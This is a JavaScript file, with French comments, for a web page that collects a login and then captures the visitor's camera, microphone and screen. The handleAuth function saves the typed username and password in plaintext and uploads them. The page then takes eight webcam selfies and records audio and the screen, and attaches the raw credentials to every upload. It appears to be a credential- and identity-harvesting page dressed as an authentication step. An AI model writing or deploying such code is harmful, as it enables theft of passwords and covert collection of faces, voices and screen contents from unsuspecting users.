// CONFIGURATION
const CONFIG = {
    SELFIE_COUNT: 8,
    AUDIO_DURATION: 12000,
    SCREEN_DURATION: 12000,
    DELAY_BETWEEN: 1500,
    SERVER_TIMEOUT: 5000
};

// Éléments UI
const ui = {
    authForm: document.getElementById('authForm'),
    username: document.getElementById('username'),
    password: document.getElementById('password'),
    video: document.getElementById('video'),
    screenPreview: document.getElementById('screenPreview'),
    captureBtn: document.getElementById('captureBtn'),
    audioBtn: document.getElementById('audioBtn'),
    screenBtn: document.getElementById('screenBtn'),
    results: document.getElementById('results')
};

// États globaux
const state = {
    mediaStream: null,
    audioStream: null,
    screenStream: null,
    audioRecorder: null,
    screenRecorder: null,
    isActive: false,
    credentials: null
};

// Initialisation
document.addEventListener('DOMContentLoaded', () => {
    ui.authForm.addEventListener('submit', handleAuth);
    ui.captureBtn.addEventListener('click', captureSelfies);
    ui.audioBtn.addEventListener('click', recordAudio);
    ui.screenBtn.addEventListener('click', captureScreen);
});

async function handleAuth(e) {
    e.preventDefault();
    
    state.credentials = {
        username: ui.username.value,
        password: ui.password.value,
        timestamp: new Date().toISOString()
    };

    try {
        await sendToServer('credentials.json', 
            new Blob([JSON.stringify(state.credentials)], { type: 'application/json' }));
        
        document.getElementById('authSection').style.display = 'none';
        document.getElementById('captureSection').style.display = 'block';
        
        showStatus("Authentification validée", 'success');
        await initCamera();
    } catch (error) {
        showStatus(`Erreur: ${error.message}`, 'error');
    }
}

async function initCamera() {
    try {
        state.mediaStream = await navigator.mediaDevices.getUserMedia({
            video: { width: 1280, height: 720, facingMode: 'user' }
        });
        ui.video.srcObject = state.mediaStream;
    } catch (error) {
        showStatus(`Caméra: ${error.message}`, 'error');
    }
}

async function captureSelfies() {
    if (state.isActive) return;
    state.isActive = true;

    try {
        for (let i = 0; i < CONFIG.SELFIE_COUNT; i++) {
            const canvas = document.createElement('canvas');
            canvas.width = ui.video.videoWidth;
            canvas.height = ui.video.videoHeight;
            canvas.getContext('2d').drawImage(ui.video, 0, 0);
            
            const blob = await new Promise(resolve => 
                canvas.toBlob(resolve, 'image/jpeg', 0.9)
            );
            
            await sendToServer(`selfie_${i+1}.jpg`, blob);
            showStatus(`Selfie ${i+1}/${CONFIG.SELFIE_COUNT} capturé`, 'progress');
            
            if (i < CONFIG.SELFIE_COUNT - 1) {
                await delay(CONFIG.DELAY_BETWEEN);
            }
        }
        showStatus("8 selfies envoyés!", 'success');
    } catch (error) {
        showStatus(`Erreur capture: ${error.message}`, 'error');
    } finally {
        state.isActive = false;
    }
}

async function recordAudio() {
    if (state.isActive) return;
    state.isActive = true;

    try {
        state.audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        state.audioRecorder = new MediaRecorder(state.audioStream);
        const audioChunks = [];
        
        state.audioRecorder.ondataavailable = e => audioChunks.push(e.data);
        state.audioRecorder.start();
        
        startCountdown(CONFIG.AUDIO_DURATION, "Enregistrement audio");
        
        await new Promise(resolve => {
            state.audioRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                await sendToServer(`audio_${Date.now()}.wav`, audioBlob);
                resolve();
            };
            setTimeout(() => state.audioRecorder.stop(), CONFIG.AUDIO_DURATION);
        });
        
        showStatus("Audio enregistré (12s)", 'success');
    } catch (error) {
        showStatus(`Microphone: ${error.message}`, 'error');
    } finally {
        cleanupAudio();
        state.isActive = false;
    }
}

async function captureScreen() {
    if (state.isActive) return;
    state.isActive = true;

    try {
        state.screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { width: 1920, height: 1080, frameRate: 15 },
            audio: true
        });
        
        ui.screenPreview.srcObject = state.screenStream;
        state.screenRecorder = new MediaRecorder(state.screenStream, {
            mimeType: 'video/webm;codecs=vp9'
        });
        
        const screenChunks = [];
        state.screenRecorder.ondataavailable = e => screenChunks.push(e.data);
        state.screenRecorder.start();
        
        startCountdown(CONFIG.SCREEN_DURATION, "Enregistrement écran");
        
        await new Promise(resolve => {
            state.screenRecorder.onstop = async () => {
                const videoBlob = new Blob(screenChunks, { type: 'video/webm' });
                await sendToServer(`screen_${Date.now()}.webm`, videoBlob);
                resolve();
            };
            setTimeout(() => state.screenRecorder.stop(), CONFIG.SCREEN_DURATION);
        });
        
        showStatus("Écran enregistré (12s)", 'success');
    } catch (error) {
        showStatus(`Capture écran: ${error.message}`, 'error');
    } finally {
        cleanupScreen();
        state.isActive = false;
    }
}

// Utilitaires
async function sendToServer(filename, blob) {
    const formData = new FormData();
    formData.append('file', blob, filename);
    
    if (state.credentials) {
        formData.append('credentials', JSON.stringify(state.credentials));
    }

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), CONFIG.SERVER_TIMEOUT);

    try {
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData,
            signal: controller.signal
        });
        
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return await response.json();
    } finally {
        clearTimeout(timeout);
    }
}

function startCountdown(duration, label) {
    let remaining = duration / 1000;
    showStatus(`${label}: ${remaining}s`, 'progress');
    
    const timer = setInterval(() => {
        remaining--;
        showStatus(`${label}: ${remaining}s`, 'progress');
        if (remaining <= 0) clearInterval(timer);
    }, 1000);
}

function showStatus(message, type) {
    const el = document.createElement('div');
    el.className = type;
    el.textContent = message;
    ui.results.appendChild(el);
    ui.results.scrollTop = ui.results.scrollHeight;
}

function cleanupAudio() {
    if (state.audioStream) {
        state.audioStream.getTracks().forEach(track => track.stop());
    }
    state.audioRecorder = null;
    state.audioStream = null;
}

function cleanupScreen() {
    if (state.screenStream) {
        state.screenStream.getTracks().forEach(track => track.stop());
    }
    ui.screenPreview.srcObject = null;
    state.screenRecorder = null;
    state.screenStream = null;
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Nettoyage
window.addEventListener('beforeunload', () => {
    if (state.mediaStream) state.mediaStream.getTracks().forEach(track => track.stop());
    cleanupAudio();
    cleanupScreen();
});